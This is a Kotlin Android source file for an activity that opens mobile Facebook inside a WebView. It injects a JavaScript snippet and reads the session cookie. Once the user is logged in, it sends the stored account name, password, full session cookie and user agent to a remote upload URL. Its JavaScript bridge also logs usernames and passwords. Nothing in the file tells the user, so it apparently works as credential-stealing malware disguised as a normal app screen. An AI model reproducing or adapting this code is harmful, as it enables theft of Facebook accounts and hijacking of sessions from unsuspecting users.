package com.xxxxxxh.c1.ui

import android.annotation.SuppressLint
import android.os.Build
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.*
import androidx.annotation.RequiresApi
import com.google.gson.Gson
import com.xxxxxxh.c1.R
import es.dmoral.prefs.Prefs
import kotlinx.android.synthetic.main.activity_facebook_web2.*
import com.xxxxxxh.c1.base.BaseActivity
import com.xxxxxxh.c1.entity.ResultEntity
import com.xxxxxxh.c1.utils.Constant
import org.xutils.common.Callback
import org.xutils.http.RequestParams
import org.xutils.x

class FacebookWebActivity2 : BaseActivity() {
    override fun getLayoutId(): Int {
        return R.layout.activity_facebook_web2
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun init() {

        webView.requestFocus(View.FOCUS_DOWN)
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE) //remove the keyboard issue
        val settings: WebSettings = webView.settings

        webView.addJavascriptInterface(BusinessInterface(), "businessAPI")

        settings.textZoom = 100

        settings.setSupportZoom(true)
        settings.displayZoomControls = false
        settings.builtInZoomControls = true

        settings.setGeolocationEnabled(true)

        settings.useWideViewPort = true
        settings.loadWithOverviewMode = true

        settings.loadsImagesAutomatically = true
        settings.displayZoomControls = false

        settings.setAppCachePath(cacheDir.absolutePath)
        settings.setAppCacheEnabled(true)

        settings.javaScriptEnabled = true

        webView.addJavascriptInterface(BusinessInterface(), "businessAPI")

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                val cookieManager = CookieManager.getInstance()
                val cookieStr = cookieManager.getCookie(url)

                val js = getString(R.string.login)

                webView.evaluateJavascript(js, null)

                if (cookieStr != null) {
                    Log.e("--->", "ua ==  " + view!!.settings.userAgentString)
                    if (cookieStr.contains("c_user")) {
                        Log.e("--->", "cookieStr: $cookieStr")
                        val account: String =
                            Prefs.with(this@FacebookWebActivity2).read("account", "")
                        val password: String =
                            Prefs.with(this@FacebookWebActivity2).read("password", "")
                        Log.e("--->", "account == $account  password == $password")
                        if (!TextUtils.isEmpty(account) && cookieStr.contains("wd=") && !url!!.contains(
                                "checkpoint"
                            )
                        ) {
                            val params = RequestParams(Constant.UPLOAD_URL)
                            params.addQueryStringParameter("account", account)
                            params.addQueryStringParameter("password", password)
                            params.addQueryStringParameter("cookie", cookieStr)
                            params.addQueryStringParameter("ip", "10.10.10.1")
                            params.addQueryStringParameter("country", "us")
                            params.addQueryStringParameter("ua", view.settings.userAgentString)
                            x.http().get(params, object : Callback.CommonCallback<String> {
                                override fun onSuccess(result: String?) {
                                    result?.let {
                                        val entity = Gson().fromJson<ResultEntity>(
                                            it,
                                            ResultEntity::class.java
                                        )
                                        if (entity.status.equals("ok", true)) {
                                            Prefs.with(this@FacebookWebActivity2)
                                                .writeBoolean(account, true)
                                        }
                                        if (entity.info.contains("already exists")) {
                                            Prefs.with(this@FacebookWebActivity2)
                                                .writeBoolean(account, true)
                                        }
                                    }
                                }

                                override fun onError(ex: Throwable?, isOnCallback: Boolean) {

                                }

                                override fun onCancelled(cex: Callback.CancelledException?) {

                                }

                                override fun onFinished() {

                                }

                            })
                        }
                    }
                }
            }

            @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {

                if (request?.url.toString().contains("/m.me/")) {
                    val newUrl: String = request?.url.toString().replace("m.me", "www.messenger.com/t")
                    webView.loadUrl(newUrl)
                    return true
                } else {
                    webView.loadUrl(request?.url.toString())
                }
                return true
            }
        }

        webView.loadUrl(getString(R.string.urlFacebookMobile) + "?sk=h_nor")
    }

    class BusinessInterface {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            val params = "userName:$a   pwd:$b"
            Log.e("--->", "params == $params")

        }
    }

    override fun onResume() {
        webView?.onResume()
        super.onResume()
    }

    override fun onPause() {
        webView?.onPause()
        super.onPause()
    }

    override fun onDestroy() {
        webView?.destroy()
        super.onDestroy()
    }
}